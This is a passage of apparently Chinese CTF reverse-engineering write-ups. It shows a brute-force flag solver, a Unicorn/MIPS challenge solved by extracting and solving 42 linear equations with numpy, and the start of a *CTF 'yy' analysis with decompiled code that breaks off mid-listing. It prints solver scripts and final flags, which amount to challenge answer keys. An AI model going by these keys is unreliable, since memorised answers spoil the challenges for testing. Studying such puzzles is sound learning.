class="number">0x4D79419D</span>;</span><br><span class="line">v35 = v15;</span><br><span class="line">v51 = enc[v36 - <span class="number">1</span>] != v15;</span><br></pre></td></tr></table></figure><p>python实现逻辑如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = input[i-1]%7 + input[i]</span><br><span class="line">b = (input()[i-1] ^ 0x12) * 3 + 2</span><br><span class="line">num = (a ^ b) &amp; 0xff</span><br></pre></td></tr></table></figure><p>直接爆破, 用可见字符进行过滤:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enc = [0, 0xF3, 0x2E, 0x18, 0x36, 0xE1, 0x4C, 0x22, 0xD1, 0xF9, 0x8C, 0x40, 0x76, 0xF4, 0x0E, 0x00, 0x05, 0xA3, 0x90, 0x0E, 0xA5]</span><br><span class="line"></span><br><span class="line">def des(context, num):</span><br><span class="line">    if context == 21:</span><br><span class="line">        print num</span><br><span class="line">        return 0</span><br><span class="line">    for i in range(0xFF):</span><br><span class="line">        for j in range(0xFF):</span><br><span class="line">            a = j%7 + i</span><br><span class="line">            b = (j ^ 0x12) * 3 + 2</span><br><span class="line">            tmp = (a ^ b) &amp; 0xff</span><br><span class="line">            if tmp == enc[context] and j == num[context-1]:</span><br><span class="line">                if 32 &lt;= i &lt;= 127:</span><br><span class="line">                    num.append(i)</span><br><span class="line">                    des(context+1, num)</span><br><span class="line"></span><br><span class="line">for i in range(32, 128):</span><br><span class="line">    num = []</span><br><span class="line">    num.append(i)</span><br><span class="line">    des(1, num)</span><br></pre></td></tr></table></figure><p>最终得flag:<br>    <code>#flag&#123;mY-CurR1ed_Fns&#125;</code></p><p>这里是我想复杂了, 四则运算都是可逆的, 所以知道一位就能求出下一位且固定, 不需要写DES来搜….</p><p>最后查一下md5发现是‘#’, 也就是第一个字符。</p><h2 id="babyunic"><a href="#babyunic" class="headerlink" title="babyunic"></a>babyunic</h2><p>使用unicorn引擎, 翻一下<a href="https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h">unicorn源码</a>可以得知几个函数及参数的意思</p><p>可以知道架构是mips, 大端序。</p><p>IDA有可以反编译的模块, 但….效果很爆炸….</p><p>幸好代码逻辑很简单, 对着输入循环右移5位, 然后异或下标, 最后加减得42个结果。</p><p>接下来就是线性代数解42元方程了。</p><p>脚本提取方程组:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bg = 0x000000CC</span><br><span class="line">end = 0x0000706C</span><br><span class="line"></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line">def next_instr(addr):</span><br><span class="line">    return addr + ItemSize(addr)</span><br><span class="line"></span><br><span class="line">f = open(&quot;data.txt&quot;, &#x27;w&#x27;)</span><br><span class="line"></span><br><span class="line">print &gt;&gt; f, &#x27;[[1, &#x27;,while addr &lt; end:</span><br><span class="line">    next = next_instr(addr)</span><br><span class="line">    if &#x27;addiu&#x27; == GetMnem(addr) :</span><br><span class="line">        i = str(GetOperandValue(addr, 1))</span><br><span class="line">        dest = next_instr(next)</span><br><span class="line">        if &#x27;addu&#x27; == GetMnem(dest):</span><br><span class="line">            print &gt;&gt; f, &quot;1&quot;,        elif &#x27;subu&#x27; == GetMnem(dest):</span><br><span class="line">            print &gt;&gt; f, &quot;-1&quot;,        if i == &#x27;41&#x27;:</span><br><span class="line">            print &gt;&gt; f, &quot;], &quot;,            print &gt;&gt; f, &quot;[1&quot;,        else:</span><br><span class="line">            print &gt;&gt; f, &#x27;, &#x27;,    addr = next_instr(addr)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后利用numpy模块求解方程:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from numpy import *</span><br><span class="line"></span><br><span class="line">enc = [-108, -200, 294, -216, -1008, 660, -866, 1770, 220, 6, -244, -522, -1406, -816, 386, 990, 334, 690, -1832, 372, -1370, -1580, 450, -1668, 858, 326, -196, -1516, 462, 2012, -696, 152, 2142, -592, -68, 878, -178, -1994, 1472, 1710, 1684, 34]</span><br><span class="line"></span><br><span class="line">s = [[1, 1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 ], [1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , 1 ], [1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 ], [1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 ], [1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , -1 ], [1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 ], [1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 ], [1 , 1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 ], [1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 ], [1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 ], [1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 ], [1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 ], [1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 ], [1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 ], [1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 ], [1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 ], [1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 ], [1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 ], [1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 ], [1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , -1 ], [1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 ], [1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 ], [1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 ], [1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 ], [1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 ], [1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 ], [1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 ], [1 , -1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 ], [1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 ], [1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 ], [1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 ], [1 , 1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 ], [1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , 1 , -1 , 1 ], [1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , -1 ], [1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 ], [1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 ], [1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , 1 , -1 ], [1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 ], [1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 ], [1 , -1 , -1 , -1 , -1 , 1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 ], [1 , -1 , -1 , -1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , -1 , -1 , 1 , 1 , -1 , 1 , 1 , 1 , 1 ], [1 , 1 , 1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , 1 , 1 , -1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 , -1 , 1 , -1 , -1 , 1 , 1 , 1 , 1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , -1 , 1 ]]</span><br><span class="line"></span><br><span class="line">a = asarray(s)</span><br><span class="line">b = asarray(enc)</span><br><span class="line">x = linalg.solve(a, b)</span><br><span class="line">print(x)</span><br><span class="line">y = []</span><br><span class="line">for i in range(42):</span><br><span class="line">   y.append(int(round(x[i])))</span><br><span class="line">print(y)</span><br><span class="line">print(allclose(dot(a, x), b))</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(len(y)):</span><br><span class="line">    y[i] ^= i</span><br><span class="line">    c = (y[i] &lt;&lt; 5 | y[i] &gt;&gt; 3) &amp; 0xff</span><br><span class="line">    print c,    flag += chr(c)</span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>最终的flag:<br><code>&#123;Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> C++-re </tag>
            
            <tag> Unicorn </tag>
            
            <tag> Ollvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 *CTF</title>
      <link href="/wp-games-2019starctf/"/>
      <url>/wp-games-2019starctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>赛后复现, 学习学习！</p><h2 id="yy"><a href="#yy" class="headerlink" title="yy"></a>yy</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/StarCTF/yy.zip">yy</a></p><p>这题真是调和猜出来的0.0…..</p><p>根据调试和猜测, 从yylex()函数中的yysec[]数组可以猜出合法字符为。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">yyaccept = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(yyec)):</span><br><span class="line">   <span class="keyword">if</span> yyec[i] != <span class="number">0x01</span> :</span><br><span class="line">     yyaccept.append(i)</span><br><span class="line">   print(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(chr, yyaccept)))</span><br><span class="line"></span><br><span class="line">yyaccept = <span class="string">&quot;*0123456789CFT_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>猜测为:*CTF{0123456789_abcdefghijklmnopqrstuvwxyz}</p><p>继续调试可发现, 程序会根据输入字符从box[]中取出对应的字符替换buffer中的字符, 而<code>“_”</code>则是调用aes_cbc_encrypt进行加密, 并更新buffer。最终和cmp进行对比:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">           <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(result, cmp, <span class="number">0xA0</span>uLL) )</span><br><span class="line">             <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             <span class="built_in">puts</span>(<span class="string">&quot;try again!&quot;</span>);</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">           pc = <span class="number">0</span>;</span><br><span class="line">           buffer = *(_QWORD *)&amp;append;</span><br><span class="line">           qword_5556FE90A3E8 = qword_5556FE90A2B8;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">           pc = <span class="number">0</span>;</span><br><span class="line">           buffer = *(_QWORD *)&amp;append;</span><br><span class="line">           qword_5556FE90A3E8 = qword_5556FE90A2B8;</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">           aes_cbc_encrypt(&amp;buffer);</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">           aes_cbc_encrypt(&amp;buffer);</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">           v1 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v1) = box[<span class="number">0</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x10</span>u:</span><br><span class="line">           v2 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v2) = box[<span class="number">1</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x11</span>u:</span><br><span class="line">           v3 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v3) = box[<span class="number">2</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x12</span>u:</span><br><span class="line">           v4 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v4) = box[<span class="number">3</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x13</span>u:</span><br><span class="line">           v5 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v5) = box[<span class="number">4</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x14</span>u:</span><br><span class="line">           v6 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v6) = box[<span class="number">5</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x15</span>u:</span><br><span class="line">           v7 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v7) = box[<span class="number">6</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x16</span>u:</span><br><span class="line">           v8 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v8) = box[<span class="number">7</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x17</span>u:</span><br><span class="line">           v9 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v9) = box[<span class="number">8</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x18</span>u:</span><br><span class="line">           v10 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v10) = box[<span class="number">9</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x19</span>u:</span><br><span class="line">           v11 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v11) = box[<span class="number">10</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x1A</span>u:</span><br><span class="line">           v12 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v12) = box[<span class="number">11</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x1B</span>u:</span><br><span class="line">           v13 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v13) = box[<span class="number">12</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x1C</span>u:</span><br><span class="line">           v14 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v14) = box[<span class="number">13</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x1D</span>u:</span><br><span class="line">           v15 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v15) = box[<span class="number">14</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x1E</span>u:</span><br><span class="line">           v16 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v16) = box[<span class="number">15</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x1F</span>u:</span><br><span class="line">           v17 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v17) = box[<span class="number">16</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">           v18 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v18) = box[<span class="number">17</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x21</span>u:</span><br><span class="line">           v19 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v19) = box[<span class="number">18</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x22</span>u:</span><br><span class="line">           v20 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v20) = box[<span class="number">19</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x23</span>u:</span><br><span class="line">           v21 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v21) = box[<span class="number">20</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x24</span>u:</span><br><span class="line">           v22 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v22) = box[<span class="number">21</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x25</span>u:</span><br><span class="line">           v23 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v23) = box[<span class="number">22</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x26</span>u:</span><br><span class="line">           v24 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v24) = box[<span class="number">23</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x27</span>u:</span><br><span class="line">           v25 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v25) = box[<span class="number">24</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x28</span>u:</span><br><span class="line">           v26 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v26) = box[<span class="number">25</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x29</span>u:</span><br><span class="line">           v27 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v27) = box[<span class="number">26</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x2A</span>u:</span><br><span class="line">           v28 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v28) = box[<span class="number">27</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">0x2B</span>u:</span><br><span class="line">           v29 = pc++;</span><br><span class="line">           *((_BYTE *)&amp;buffer + v29) = box[<span class="number">28</span>];</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         <span 